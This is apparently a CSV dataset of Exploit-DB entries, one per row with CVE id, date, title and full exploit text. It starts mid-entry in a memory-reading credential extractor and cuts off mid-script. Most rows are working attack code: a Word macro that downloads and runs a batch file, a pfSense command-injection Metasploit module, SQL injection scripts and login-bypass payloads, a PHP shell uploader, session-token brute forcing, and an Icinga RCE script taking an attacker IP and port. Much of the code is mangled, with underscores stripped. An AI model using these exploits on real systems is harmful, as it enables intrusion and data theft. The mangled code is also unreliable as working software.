Encoding.ASCII.GetString(buffer); extractcredentials(text); extractmaster(text); extractaccount(text); address = new IntPtr(memInfo.BaseAddress.ToInt64() + memInfo.RegionSize.ToInt64()); CloseHandle(processHandle); [DllImport(""kernel32.dll"")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, int dwProcessId); [DllImport(""kernel32.dll"")] public static extern bool CloseHandle(IntPtr hObject); [DllImport(""ntdll.dll"")] public static extern uint NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UInt32 NumberOfBytesToRead, IntPtr NumberOfBytesRead); [DllImport(""kernel32.dll"", SetLastError = true)] public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORYBASICINFORMATION lpBuffer, uint dwLength); [StructLayout(LayoutKind.Sequential)] public struct MEMORYBASIC_INFORMATION public IntPtr BaseAddress; public IntPtr AllocationBase; public uint AllocationProtect; public IntPtr RegionSize; public uint State; public uint Protect; public uint Type;"
CVE-2023-34634,"{""CVE-2023-34634"": 1}",2023-07-28,GreenShot  1.2.10 - Insecure Deserialization Arbitrary Code Execution,https://www.exploit-db.com/exploits/51633,"﻿Exploit Title: GreenShot 1.2.10 - Insecure Deserialization Arbitrary Code Execution Date: 26/07/2023 Exploit Author: p4r4bellum Vendor Homepage: <URL> Software Link: <URL> Version: 1.2.6.10 Tested on: windows 10.0.19045 N/A build 19045 CVE : CVE-2023-34634 GreenShot 1.2.10 and below is vulnerable to an insecure object deserialization in its custom .greenshot format A stream of .Net object is serialized and inscureley deserialized when a .greenshot file is open with the software On a default install the .greenshot file extension is associated with the programm, so double-click on a.greenshot file will lead to arbitrary code execution Generate the payload. You need yserial.net to be installed on your machine. Grab it at <URL> ./ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c ""calc"" --outputpath payload.bin -o raw load the payload $payload = Get-Content .\payload.bin -Encoding Byte retrieve the length of the payload $length = $payload.Length load the required assembly to craft a PNG file Add-Type -AssemblyName System.Drawing the following lines creates a png file with some text. Code borrowed from <URL> $filename = ""$home\"
CVE-2023-29918,"{""CVE-2023-29918"": 1}",2023-07-28,RosarioSIS 10.8.4 - CSV Injection,https://www.exploit-db.com/exploits/51622,"Exploit Title: RosarioSIS 10.8.4 - CSV Injection Google Dork:NA Exploit Author: Ranjeet Jaiswal# Vendor Homepage: <URL> Software Link: <URL> Affected Version: 10.8.4 Category: WebApps Tested on: Windows 10 1. Vendor Description: RosarioSIS has been designed to address the most important needs of administrators, teachers, support staff, parents, students, and clerical personnel. However, it also adds many components not typically found in Student Information Systems. 2. Technical Description: A CSV Injection (also known as Formula Injection) vulnerability in the RosarioSIS web application with version 10.8.4 allows malicious users to execute malicious payload in csv/xls and redirect authorized user to malicious website. 3. Proof Of Concept: 3.1. Proof of Concept for CSV injection. # Step to reproduce. Step1:Login in to RosarioSIS 10.8.4 Step2:Go to Periods page Step3:Add CSV injection redirection payload such as ""=HYPERLINK("" <URL> the Title field Step4:click on Save button to save data. Step5:Go to export tab and export the data Step6:When user open download Periods.xls file.You will see redirection hyperlink. Step7:When user click on link ,User will be redirected to Attacker or malicious website. 4. Solution: Upgrade to latest release of RosarioSIS."
CVE-2023-3849,"{""CVE-2023-3849"": 1}",2023-07-28,mooDating 1.2 - Reflected Cross-site scripting (XSS),https://www.exploit-db.com/exploits/51628,"Exploit Title: mooDating 1.2 - Reflected Cross-site scripting (XSS) Exploit Author: CraCkEr aka (skalvin) Date: 22/07/2023 Vendor: mooSocial Vendor Homepage: <URL> Software Link: <URL> Version: 1.2 Tested on: Windows 10 Pro Impact: Manipulate the content of the site CVE: CVE-2023-3849, CVE-2023-3848, CVE-2023-3847, CVE-2023-3846, CVE-2023-3843, CVE-2023-3845, CVE-2023-3844 #Greetings ThePitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob #Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /matchmakings/question URL parameter is vulnerable to RXSS <URL> <URL> Path: /friends URL parameter is vulnerable to RXSS <URL> <URL> Path: /friends/ajaxinvite URL parameter is vulnerable to RXSS <URL> <URL> Path: /pages URL parameter is vulnerable to RXSS <URL> <URL> Path: /users URL parameter is vulnerable to RXSS <URL> <URL> Path: /users/view URL parameter is vulnerable to RXSS <URL> <URL> Path: /find-a-match URL parameter is vulnerable to RXSS <URL> <URL> [XSS Payload]: pksyk""> s9a6 [-] Done"
CVE-2023-2636,"{""CVE-2023-2636"": 1}",2023-07-28,WordPress Plugin AN_Gradebook 5.0.1 - SQLi,https://www.exploit-db.com/exploits/51632,"#!/usr/bin/python3 Exploit Title: WordPress Plugin ANGradebook <= 5.0.1 - Subscriber+ SQLi Date: 2023-07-26 Exploit Author: Lukas Kinneberg Github: <URL> Vendor Homepage: <URL> Software Link: <URL> Tested on: WordPress 6.2.2 CVE: CVE-2023-2636 from datetime import datetime import os import requests import json User Input: targetip = 'CHANGETHIS' targetport = '80' username = 'hacker' password = 'hacker' banner = ' ||C |V |E |- |2 |0 |2 |3 |- |2 |6 |3 |6 || Exploit Author: Lukas Kinneberg print(banner) print('[] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S') Authentication: session = requests.Session() auth_url = ' <URL> + target_ip + ':' + target_port + '/wp-login.php' check = session.get(auth_url) Header: header = { 'Host': target_ip, 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8', 'Accept-Language': 'de,en-US;q=0.7,en;q=0.3', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': ' <URL> + target_ip, 'Connection': 'close', 'Upgrade-Insecure-Requests': '1' Body: body = { 'log': username, 'pwd': password, 'wp-submit': 'Log In', 'testcookie': '1' auth = session.post(auth_url, headers=header, data=body) SQL-Injection (Exploit): Generate payload for sqlmap cookies_session = session.cookies.get_dict() cookie = json.dumps(cookies_session) cookie = cookie.replace('""}','') cookie = cookie.replace('{""', '') cookie = cookie.replace('""', '') cookie = cookie.replace("" "", '') cookie = cookie.replace("":"", '=') cookie = cookie.replace(',', '; ') print('[] Payload for SQL-Injection:') Enter the URL path of the course after the targetport below exploitcodeurl = r'sqlmap -u "" <URL> + targetip + ':' + targetport + r'/wp-admin/admin-ajax.php?action=course&id=3"" ' exploitcoderisk = '--level 2 --risk 2 ' exploitcodecookie = '--cookie=""' + cookie + '"" ' SQLMAP Printout print(' Sqlmap options:') print(' -a, --all Retrieve everything') print(' -b, --banner Retrieve DBMS banner') print(' --current-user Retrieve DBMS current user') print(' --current-db Retrieve DBMS current database') print(' --passwords Enumerate DBMS users password hashes') print(' --tables Enumerate DBMS database tables') print(' --columns Enumerate DBMS database table column') print(' --schema Enumerate DBMS schema') print(' --dump Dump DBMS database table entries') print(' --dump-all Dump all DBMS databases tables entries') retrievemode = input('Which sqlmap option should be used to retrieve your information? ') exploitcode = exploitcodeurl + exploitcoderisk + exploitcodecookie + retrieve_mode + ' -p id -v 0 --answers=""follow=Y"" --batch' os.system(exploitcode) print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')"
CVE-2023-38501,"{""CVE-2023-38501"": 1}",2023-07-28,copyparty v1.8.6 - Reflected Cross Site Scripting (XSS),https://www.exploit-db.com/exploits/51635,Exploit Title: copyparty v1.8.6 - Reflected Cross Site Scripting (XSS) Date: 23/07/2023 Exploit Author: Vartamtezidis Theodoros () Vendor Homepage: <URL> Software Link: <URL> Version: <=1.8.6 Tested on: Debian Linux CVE : CVE-2023-38501 Description Copyparty is a portable file server. Versions prior to 1.8.6 are subject to a reflected cross-site scripting (XSS) Attack. Vulnerability that exists in the web interface of the application could allow an attacker to execute malicious javascript code by tricking users into accessing a malicious link.
CVE-2023-33148,"{""CVE-2023-33148"": 1}",2023-07-20,Microsoft Office 365 Version 18.2305.1222.0 - Elevation of Privilege + RCE.,https://www.exploit-db.com/exploits/51609,"Title: Microsoft Office 365 Version 18.2305.1222.0 - Elevation of Privilege + RCE. #Author: nu11secur1ty #Date: 07.18.2023 #Vendor: <URL> #Software: <URL> #Reference: <URL> #CVE-2023-33148 #Description: The Microsoft Office 365 Version 18.2305.1222.0 app is vulnerable to Elevation of Privilege. The attacker can use this vulnerability to attach a very malicious WORD file in the Outlook app which is a part of Microsoft Office 365 and easily can trick the victim to click on it - opening it and executing a very dangerous shell command, in the background of the local PC. This execution is without downloading this malicious file, and this is a potential problem and a very dangerous case! This can be the end of the victim's PC, it depends on the scenario. #Staus: HIGH Vulnerability [+]Exploit: - Exploit Server: `vb Sub AutoOpen() Call Shell(""cmd.exe /S /c"" & ""curl -s <URL> > salaries.bat && .\salaries.bat"", vbNormalFocus) End Sub #Reproduce: [href]( <URL> #Proof and Exploit [href]( <URL> #Time spend: 00:35:00"
CVE-2023-27253,"{""CVE-2023-27253"": 1}",2023-07-20,pfSense v2.7.0 - OS Command Injection,https://www.exploit-db.com/exploits/51608,"Exploit Title: pfSense v2.7.0 - OS Command Injection Exploit Author: Emir Polat CVE-ID : CVE-2023-27253 class MetasploitModule < Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::HttpClient include Msf::Exploit::CmdStager include Msf::Exploit::FileDropper prepend Msf::Exploit::Remote::AutoCheck def initialize(info = {}) super( updateinfo( info, 'Name' => 'pfSense Restore RRD Data Command Injection', 'Description' => %q{ This module exploits an authenticated command injection vulnerabilty in the ""restorerrddata()"" function of pfSense prior to version 2.7.0 which allows an authenticated attacker with the ""WebCfg - Diagnostics: Backup & Restore"" privilege to execute arbitrary operating system commands as the ""root"" user. This module has been tested successfully on version 2.6.0-RELEASE. 'License' => MSFLICENSE, 'Author' => [ 'Emir Polat', vulnerability discovery & metasploit module 'References' => [ ['CVE', '2023-27253'], ['URL', ' <URL> ['URL', ' <URL> 'DisclosureDate' => '2023-03-18', 'Platform' => ['unix'], 'Arch' => [ ARCHCMD ], 'Privileged' => true, 'Targets' => [ [ 'Automatic Target', {}] 'Payload' => { 'BadChars' => ""\x2F\x27"", 'Compat' => 'PayloadType' => 'cmd', 'RequiredCmd' => 'generic netcat' 'DefaultOptions' => { 'RPORT' => 443, 'SSL' => true 'DefaultTarget' => 0, 'Notes' => { 'Stability' => [CRASHSAFE], 'Reliability' => [REPEATABLESESSION], 'SideEffects' => [CONFIGCHANGES, IOCINLOGS] registeroptions [ OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']), OptString.new('PASSWORD', [true, 'Password to authenticate with', 'pfsense']) end def check unless login return Exploit::CheckCode::Unknown(""#{peer} - Could not obtain the login cookies needed to validate the vulnerability!"") end res = sendrequestcgi( 'uri' => normalizeuri(targeturi.path, 'diagbackup.php'), 'method' => 'GET', 'keepcookies' => true return Exploit::CheckCode::Unknown(""#{peer} - Could not connect to web service - no response"") if res.nil? return Exploit::CheckCode::Unknown(""#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}"") unless res.code == 200 unless res&.body&.include?('Diagnostics: ') return Exploit::CheckCode::Safe('Vulnerable module not reachable') end version = detectversion unless version return Exploit::CheckCode::Detected('Unable to get the pfSense version') end unless Rex::Version.new(version) < Rex::Version.new('2.7.0-RELEASE') return Exploit::CheckCode::Safe(""Patched pfSense version #{version} detected"") end Exploit::CheckCode::Appears(""The target appears to be running pfSense version #{version}, which is unpatched!"") end def login Skip the login process if we are already logged in. return true if csrf = getcsrf('index.php', 'GET') unless csrf printerror('Could not get the expected CSRF token for index.php when attempting login!') return false end res = sendrequestcgi( 'uri' => normalizeuri(targeturi.path, 'index.php'), 'method' => 'POST', 'varspost' => { 'csrfmagic' => csrf, 'usernamefld' => datastore['USERNAME'], 'passwordfld' => datastore['PASSWORD'], 'login' => '' 'keepcookies' => true if res && res.code == 302 = true true else false end end def detectversion res = sendrequestcgi( 'uri' => normalizeuri(targeturi.path, 'index.php'), 'method' => 'GET', 'keepcookies' => true If the response isn't a 200 ok response or is an empty response, just return nil. unless res && res.code == 200 && res.body return nil end if (%r{Version.+ (? [0-9.]+-RELEASE)\n? }m =~ res.body).nil? nil else version end end def getcsrf(uri, methods) res = sendrequestcgi( 'uri' => normalizeuri(targeturi.path, uri), 'method' => methods, 'keepcookies' => true unless res && res.body return nil If no response was returned or an empty response was returned, then return nil. end Try regex match the response body and save the match into a variable named csrf. if (/var csrfMagicToken = ""(? sid:[a-z0-9,;:]+)"";/ =~ res.body).nil? return nil No match could be found, so the variable csrf won't be defined. else return csrf end end def dropconfig csrf = getcsrf('diagbackup.php', 'GET') unless csrf failwith(Failure::UnexpectedReply, 'Could not get the expected CSRF token for diagbackup.php when dropping the config!') end postdata = Rex::MIME::Message.new postdata.addpart(csrf, nil, nil, 'form-data; name=""csrf_magic""') post_data.add_part('rrddata', nil, nil, 'form-data; name=""backuparea""') post_data.add_part('', nil, nil, 'form-data; name=""encrypt_password""') post_data.add_part('', nil, nil, 'form-data; name=""encrypt_password_confirm""') post_data.add_part('Download configuration as XML', nil, nil, 'form-data; name=""download""') post_data.add_part('', nil, nil, 'form-data; name=""restorearea""') post_data.add_part('', 'application/octet-stream', nil, 'form-data; name=""conffile""') post_data.add_part('', nil, nil, 'form-data; name=""decrypt_password""') res = send_request_cgi( 'uri' => normalize_uri(target_uri.path, 'diag_backup.php'), 'method' => 'POST', 'ctype' => ""multipart/form-data; boundary=#{post_data.bound}"", 'data' => post_data.to_s, 'keep_cookies' => true if res && res.code == 200 && res.body =~ / / return res.body else return nil end end def exploit unless login fail_with(Failure::NoAccess, 'Could not obtain the login cookies!') end csrf = get_csrf('diag_backup.php', 'GET') unless csrf fail_with(Failure::UnexpectedReply, 'Could not get the expected CSRF token for diag_backup.php when starting exploitation!') end config_data = drop_config if config_data.nil? fail_with(Failure::UnexpectedReply, 'The drop config response was empty!') end if (%r{ (? .*?) } =~ config_data).nil? fail_with(Failure::UnexpectedReply, 'Could not get the filename from the drop config response!') end config_data.gsub!(' ', '${IFS}') send_p = config_data.gsub(file, ""WAN_DHCP-quality.rrd';#{payload.encoded};"") post_data = Rex::MIME::Message.new post_data.add_part(csrf, nil, nil, 'form-data; name=""csrfmagic""') postdata.addpart('rrddata', nil, nil, 'form-data; name=""backuparea""') postdata.addpart('yes', nil, nil, 'form-data; name=""donotbackuprrd""') postdata.addpart('yes', nil, nil, 'form-data; name=""backupssh""') postdata.addpart('', nil, nil, 'form-data; name=""encryptpassword""') postdata.addpart('', nil, nil, 'form-data; name=""encryptpasswordconfirm""') postdata.addpart('rrddata', nil, nil, 'form-data; name=""restorearea""') postdata.addpart(sendp.tos, 'text/xml', nil, ""form-data; name=\""conffile\""; filename=\""rrddata-config-pfSense.home.arpa-#{randtextalphanumeric(14)}.xml\"""") postdata.addpart('', nil, nil, 'form-data; name=""decryptpassword""') postdata.addpart('Restore Configuration', nil, nil, 'form-data; name=""restore""') res = sendrequestcgi( 'uri' => normalizeuri(targeturi.path, 'diagbackup.php'), 'method' => 'POST', 'ctype' => ""multipart/form-data; boundary=#{postdata.bound}"", 'data' => postdata.tos, 'keepcookies' => true if res print_error(""The response to a successful exploit attempt should be 'nil'. The target responded with an HTTP response code of #{res.code}. Try rerunning the module."") end end end"
CVE-2023-34635,"{""CVE-2023-34635"": 1}",2023-07-20,Wifi Soft Unibox Administration 3.0 &amp; 3.1 - SQL Injection,https://www.exploit-db.com/exploits/51610,"Exploit Title: Wifi Soft Unibox Administration 3.0 & 3.1 Login Page - Sql Injection Google Dork: intext:""Unibox Administration 3.1"", intext:""Unibox 3.0"" Date: 07/2023 Exploit Author: Ansh Jain Author Contact : arkinux01.com Vendor Homepage: <URL> Software Link: <URL> Version: Unibox Administration 3.0 & 3.1 Tested on: Microsoft Windows 11 CVE : CVE-2023-34635 CVE URL : <URL> The Wifi Soft Unibox Administration 3.0 and 3.1 Login Page is vulnerable to SQL Injection, which can lead to unauthorised admin access for attackers. The vulnerability occurs because of not validating or sanitising the user input in the username field of the login page and directly sending the input to the backend server and database. #How to Reproduce Step 1 : Visit the login page and check the version, whether it is 3.0, 3.1, or not. Step 2 : Add this payload "" 'or 1=1 limit 1-- - "" to the username field and enter any random password. Step 3 : Fill in the captcha and hit login. After hitting login, you have been successfully logged in as an administrator and can see anyone's user data, modify data, revoke access, etc. Login Request Parameters: username, password, captcha, action POST /index.php HTTP/2 Host: 255.255.255.255.host.com Cookie: PHPSESSID=rfds9jjjbu7jorb9kgjsko858d User-Agent: Mozilla/5.0 (X11; Linux x8664; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 83 Origin: <URL> Referer: <URL> Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers username='or+1=1+limit+1--+-&password=randompassword&captcha=69199&action=Login Login Response HTTP/2 302 Found Server: nginx Date: Tue, 18 Jul 2023 13:32:14 GMT Content-Type: text/html; charset=UTF-8 Location: ./dashboard/dashboard Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Successful Loggedin Request GET /dashboard/dashboard HTTP/2 Host: 255.255.255.255.host.com Cookie: PHPSESSID=rfds9jjjbu7jorb9kgjsko858d User-Agent: Mozilla/5.0 (X11; Linux x8664; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: <URL> Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers Successful Loggedin Response HTTP/2 200 OK Server: nginx Date: Tue, 18 Jul 2023 13:32:43 GMT Content-Type: text/html; charset=UTF-8 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Cache_control: private html content"
CVE-2023-38357,"{""CVE-2023-38357"": 1}",2023-07-20,RWS WorldServer 11.7.3 - Session Token Enumeration,https://www.exploit-db.com/exploits/51619,"Exploit Title: RWS WorldServer 11.7.3 - Session Token Enumeration Session tokens in RWS WorldServer have a low entropy and can be enumerated, leading to unauthorised access to user sessions. Details Product: WorldServer Affected Versions: 11.7.3 and earlier versions Fixed Version: 11.8.0 Vulnerability Type: Session Token Enumeration Security Risk: high Vendor URL: <URL> Vendor Status: fixed version released Advisory URL: <URL> Advisory Status: published CVE: CVE-2023-38357 CVE URL: <URL> Introduction ""WorldServer offers a flexible, enterprise-class translation management system that automates translation tasks and greatly reduces the cost of supporting large volumes of local language content."" (from the vendor's homepage) More Details WorldServer associates user sessions with numerical tokens, which always are positive values below 2^31. The SOAP action ""loginWithToken"" allows for a high amount of parallel attempts to check if a token is valid. During analysis, many assigned tokens were found to be in the 7-digit range of values. An attacker is therefore able to enumerate user accounts in only a few hours. Proof of Concept In the following an example ""loginWithToken"" request is shown: POST /ws/services/WSContext HTTP/1.1 Content-Type: text/xml;charset=UTF-8 SOAPAction: """" Content-Length: 501 Host: <URL> Connection: close User-Agent: agent FUZZ - It can be saved as file ""login-soap.req"" and be used as a request template for the command-line HTTP enumerator monsoon [1] to achieve many parallel requests: $ monsoon fuzz --threads 100 \ --template-file login-soap.req \ --range 1-2147483647 \ --hide-pattern ""InvalidSessionException"" \ ' <URL> Target URL: <URL> status header body value extract 500 191 560 5829099 500 191 556 6229259 200 191 3702 7545136 500 191 556 9054984 processed 12000000 HTTP requests in 2h38m38s 4 of 12000000 requests shown, 1225 req/s The --range parameter reflects the possible value range of 2^31 and for each value an HTTP request is sent to the WorldServer SOAP API where the FUZZ marker in the request template is replaced with the respective value. Also responses are hidden which contain ""InvalidSessionException"" as these sessions are invalid. Responses will yield a status code of 200 if an administrative session token is found. For an unprivileged user session, status code 500 is returned. Workaround Lower the rate at which requests can be issued, for example with a frontend proxy. Fix According to the vendor, upgrading to versions above 11.8.0 resolves the vulnerability. Security Risk Attackers can efficiently enumerate session tokens. In a penetration test, it was possible to get access to multiple user accounts, including administrative accounts using this method in under three hours. Additionally, by using such an administrative account it seems likely to be possible to execute arbitrary code on the underlying server by customising the REST API [2]. Thus, the vulnerability poses a high risk. Timeline 2023-03-27 Vulnerability identified 2023-03-30 Customer approved disclosure to vendor 2023-04-03 Requested security contact from vendor 2023-04-06 Vendor responded with security contact 2023-04-14 Advisory sent to vendor 2023-04-18 Vendor confirms vulnerability and states that it was already known and fixed in version 11.8.0. 2023-07-03 Customer confirms update to fixed version 2023-07-05 CVE ID requested 2023-07-15 CVE ID assigned 2023-07-19 Advisory released References [1] <URL> [2] <URL> RedTeam Pentesting GmbH RedTeam Pentesting offers individual penetration tests performed by a team of specialised IT-security experts. Hereby, security weaknesses in company networks or products are uncovered and can be fixed immediately. As there are only few experts in this field, RedTeam Pentesting wants to share its knowledge and enhance the public knowledge with research in security-related areas. The results are made available as public security advisories. More information about RedTeam Pentesting can be found at: <URL> Working at RedTeam Pentesting RedTeam Pentesting is looking for penetration testers to join our team in Aachen, Germany. If you are interested please visit: <URL> RedTeam Pentesting GmbH Tel.: +49 241 510081-0 Alter Posthof 1 Fax : +49 241 510081-99 52062 Aachen <URL> Germany Registergericht: Aachen HRB 14004 Geschäftsführer: Patrick Hof, Jens Liebchen"
CVE-2022-28171,"{""CVE-2022-28171"": 1}",2023-07-19,Hikvision Hybrid SAN Ds-a71024 Firmware - Multiple Remote Code Execution,https://www.exploit-db.com/exploits/51607,"Exploit Title: Hikvision Hybrid SAN Ds-a71024 Firmware - Multiple Remote Code Execution Date: 16 July 2023 Exploit Author: Thurein Soe CVE : CVE-2022-28171 Vendor Homepage: <URL> Software Link: N/A Refence Link: <URL> Version: Filmora 12: Ds-a71024 Firmware, Ds-a71024 Firmware Ds-a71048r-cvs Firmware Ds-a71048 Firmware Ds-a71072r Firmware Ds-a71072r Firmware Ds-a72024 Firmware Ds-a72024 Firmware Ds-a72048r-cvs Firmware Ds-a72072r Firmware Ds-a80316s Firmware Ds-a80624s Firmware Ds-a81016s Firmware Ds-a82024d Firmware Ds-a71048r-cvs Ds-a71024 Ds-a71048 Ds-a71072r Ds-a80624s Ds-a82024d Ds-a80316s Ds-a81016s Vendor Description: Hikvision is a world-leading surveillance manufacturer and supplier of video surveillance and Internet of Things (IoT) equipment for civilian and military purposes. Some Hikvision Hybrid SAN products were vulnerable to multiple remote code execution vulnerabilities such as command injection, Blind SQL injection, HTTP request smuggling, and reflected cross-site scripting. This resulted in remote code execution that allows an adversary to execute arbitrary operating system commands and more. However, an adversary must be on the same network to leverage this vulnerability to execute arbitrary commands. Vulnerability description: A manual test confirmed that The download type parameter was vulnerable to Blind SQL injection.I created a Python script to automate and enumerate SQL versions as the Application was behind the firewall and block all the requests from SQLmap. Request Body: GET /web/log/dynamic_log.php?target=makeMaintainLog&downloadtype='(selectfrom(select(sleep(10)a)' HTTP/1.1 Host: X.X.X.X.12:2004 Accept-Encoding: gzip, deflate Accept: /* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 Connection: close"
CVE-2023-37629,"{""CVE-2023-37629"": 1}",2023-07-19,Online Piggery Management System v1.0 - unauthenticated file upload vulnerability,https://www.exploit-db.com/exploits/51598,"#!/bin/bash Exploit Title: Online Piggery Management System v1.0 - unauthenticated file upload vulnerability Date: July 12 2023 Exploit Author: 1337kid Software Link: <URL> Version: 1.0 Tested on: Ubuntu CVE : CVE-2023-37629 chmod +x exploit.sh # ./exploit.sh weburl # ./exploit.sh <URL> echo "" _ _ "" echo "" / \\ \\ / / || ) \\ ) /| / / /| ) \\"" echo "" | ( \\ V /| _|/ / () / / | \\_|_ \\ / / _ \\/ /\\_, /"" echo "" \\| \\/ |_| /\\/|/ |//_/\\/|// "" echo "" "" echo if [[ $1 == '' ]]; then echo ""No URL specified!"" exit fi baseurl=$1 unauthfileupload() { CVE-2023-37629 - File upload vuln echo ""Generating shell.php"" cat > shell.php << EOF EOF echo ""done"" curl -s -F pigphoto=.php -F submit=pwned $baseurl/add-pig.php > /dev/null req=$(curl -s -I $baseurl""uploadfolder/shell.php?cmd=id"" | head -1 | awk '{print $2}') if [[ $req == ""200"" ]]; then echo ""Shell uploaded to $(echo $baseurl)uploadfolder/shell.php"" else echo ""Failed to upload a shell"" fi req=$(curl -I -s $baseurl | head -1 | awk '{print $2}') if [[ $req -eq ""200"" ]]; then unauthfileupload else echo ""Error"" echo ""Status Code: $req"" fi"
CVE-2023-1258,"{""CVE-2023-1258"": 1}",2023-07-19,ABB FlowX v4.00 - Exposure of Sensitive Information,https://www.exploit-db.com/exploits/51603,"Exploit Title: ABB FlowX v4.00 - Exposure of Sensitive Information Date: 2023-03-31 Exploit Author: Paul Smith Vendor Homepage: <URL> Version: ABB Flow-X all versions before V4.00 Tested on: Kali Linux CVE: CVE-2023-1258 #!/usr/bin/python import sys import re from bs4 import BeautifulSoup as BS import lxml import requests Set the request parameter url = sys.argv[1] def dumpusers(): response = requests.get(url) Check for HTTP codes other than 200 if response.statuscode != 200: print('Status:', response.statuscode, 'Headers:', response.headers, 'Error Response:',response.text) exit() Decode the xml response into dictionary and use the data data = response.text soup = BS(data, features=""xml"") logs = soup.findall(""log"") for log in logs: test = re.search('User (.*?) logged in',str(log)) if test: print(test.group(0)) def main(): dumpusers() if name == 'main_': main()"
CVE-2022-24715,"{""CVE-2022-24715"": 1}",2023-07-15,Icinga Web 2.10 - Authenticated Remote Code Execution,https://www.exploit-db.com/exploits/51586,"#!/usr/bin/env python3 Exploit Title: Icinga Web 2.10 - Authenticated Remote Code Execution Date: 8/07/2023 Exploit Author: Dante Corona(Aka. cxdxnt) Software Link: <URL> Vendor Homepage: <URL> Software Link: <URL> Version: <2.8.6, <2.9.6, <2.10 Tested on: Icinga Web 2 Version 2.9.2 on Linux CVE: CVE-2022-24715 Based on: <URL> import requests,argparse,re,random,string from colorama import Fore,Style def letterrandom(): letras = string.asciilowercase characterrandom = random.choices(letras, k=6) return ''.join(characterrandom) def usersurlpassword(): parser = argparse.ArgumentParser(description='Descripción de tu programa.') parser.addargument('-u', '--url',type=str,required=True, help='Insertar la URL <URL> parser.addargument('-U', '--user',type=str, required=True ,help='Insertar usuario -U user') parser.addargument('-P', '--password',type=str, required=True ,help='Insertar contraseña -P password') parser.addargument('-i', '--ip',type=str,required=True,help='Insertar IP de atacante -i IP') parser.addargument('-p','--port',type=str, required=True,help='Insertar puerto de atacante -p PORT') args = parser.parseargs() url = args.url user = args.user password=args.password ipattack = args.ip portattack = args.port return url,user,password,ipattack,portattack def login(url,user,password): try: loginurl = url + ""/icingaweb2/authentication/login"" session = requests.Session() r = session.get(loginurl) csrfregex = re.findall(r'name=""CSRFToken"" value=""([^""])""',r.text)[0] data_post = {""username"":user, ""password"":password, ""CSRFToken"":csrf_regex, ""formUID"":""form_login"", ""btn_submit"":""Login"" response = session.post(login_url,data=data_post) if ""Welcome to Icinga Web!"" in response.text: print(f""{Fore.GREEN}[]{Style.RESETALL}Session successfully."") r = session.get(loginurl) else: print(""[!]Failed to login."") exit(1) return session,csrfregex except requests.exceptions.InvalidURL: print(f""{Fore.YELLOW}[!]{Style.RESETALL} Error URL :("") exit(1) return session,csrfregex def uploadfile(session,url,characterrandom,csrfregex): webshell = f""-BEGIN RSA PRIVATE KEY- MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu KUpRKfFLfRYC9AIKjbJTWit+CqvjWYzvQwECAwEAAQJAIJLixBy2qpFoS4DSmoEm o3qGy0t6z09AIJtH+5OeRV1be+N4cDYJKffGzDa88vQENZiRm0GRq6a+HPGQMd2k TQIhAKMSvzIBnni7ot/OSie2TmJLY4SwTQAevXysE2RbFDYdAiEBCUEaRQnMnbp7 9mxDXDf6AU0cN/RPBjb9qSHDcWZHGzUCIG2Es59z8ugGrDY+pxLQnwfotadxd+Uy v/Ow5T0q5gIJAiEAyS4RaI9YG8EWx/2w0T67ZUVAw8eOMB6BIUg0Xcu+3okCIBOs /5OiPgoTdSy7bcF9IGpSE8ZgGKzgYQVZeN97YE00 -END RSA PRIVATE KEY- ""%characterrandom uploadurl = url + ""/icingaweb2/config/createresource"" r = session.get(uploadurl) csrf = re.findall(r'name=""CSRFToken"" value=""([^""]*)""',r.text)[0] datapost ={""type"":""ssh"", ""name"":""shm/""+characterrandom, ""user"":f""../../../../../../../../../../../dev/shm/{characterrandom}/run.php"", ""privatekey"":webshell, ""formUID"":""formconfigresource"", ""CSRFToken"":csrf, ""btnsubmit"":""Save Changes"" uploadresponse = session.post(uploadurl,data=datapost) check = requests.get(url + f""/icingaweb2/lib/icinga/icinga-php-thirdparty/dev/shm/{characterrandom}/run.php"") if check.statuscode != 200 : print(f""{Fore.YELLOW}[!]{Style.RESETALL}Error uploading file. :("") exit(1) else: print(f""{Fore.GREEN}[]{Style.RESET_ALL}File uploaded successfully."") def enable_module(session,url,character_random): url_module = url+""/icingaweb2/config/general"" r_module = session.get(url_module) csrf_module = re.findall(r'name=""CSRFToken"" value=""([^""])""',rmodule.text)[0] datapost = 